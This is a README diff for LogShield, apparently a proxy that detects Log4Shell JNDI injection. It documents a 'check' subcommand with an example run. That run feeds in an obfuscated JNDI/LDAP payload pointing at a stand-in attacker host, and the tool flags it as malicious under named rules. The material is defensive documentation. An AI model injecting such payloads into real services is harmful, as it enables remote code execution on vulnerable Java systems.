@@ -194,6 +194,38 @@ live `${`, so the log itself cannot re-trigger a vulnerable log pipeline):
                 "scheme":"ldap","evidence":"ldap://attacker.invalid/a"}]}
 ```
 
+### Try a payload without a proxy
+
+`logshield check` runs one payload through the same engine and explains the
+verdict. It needs no upstream, opens no network connection and forwards
+nothing, so it is the quickest way to see what LogShield does with a string, to
+write a rule exception, or to put a case in a bug report. Its output is
+defanged, so it is safe to paste into a ticket or a log.
+
+```console
+$ logshield check '${${lower:j}ndi:ldap://attacker.invalid/a}'
+input:    $%7B$%7Blower:j}ndi:ldap://attacker.invalid/a}
+          (defanged so it is safe to paste: dollar-brace becomes $%7B and % becomes %25)
+placed:   header User-Agent
+verdict:  MALICIOUS
+          block mode would BLOCK this request (monitor mode records it only)
+
+LSH-1002  jndi-lookup-evasive  [malicious]  at header-value:User-Agent
+          JNDI scheme: ldap
+          evidence: ldap://attacker.invalid/a
+          CVE-2021-44228
+
+LSH-2002  log4j-lookup-in-input  [suspicious]  at header-value:User-Agent
+          evidence: lower
+          CVE-2021-44228
+```
+
+The exit code is `0` clean, `3` suspicious, `4` malicious (and `2` for a usage
+error), so it works in scripts. `-in query|path|cookie|body` chooses where the
+payload sits, `-json` prints machine-readable output, `-` reads the payload from
+standard input, and `-disable-rule` and `-block-suspicious` mirror the proxy.
+Details: [docs/proxy.md](docs/proxy.md#explaining-a-verdict-logshield-check).
+
 ### Options
 
 | Flag | Default | Meaning |
@@ -217,6 +249,7 @@ live `${`, so the log itself cannot re-trigger a vulnerable log pipeline):
 | `-config` | none | JSON configuration file; environment variables `LOGSHIELD_*` and flags override it ([configuration](docs/configuration.md)). |
 | `-check-config` | | Validate everything, print the effective configuration, and exit. |
 | `-version` | | Print version and exit. |
+| `check PAYLOAD` | | Subcommand: explain the verdict for one payload and exit (see above). |
 
 Details, policies and limitations: [docs/proxy.md](docs/proxy.md).
 
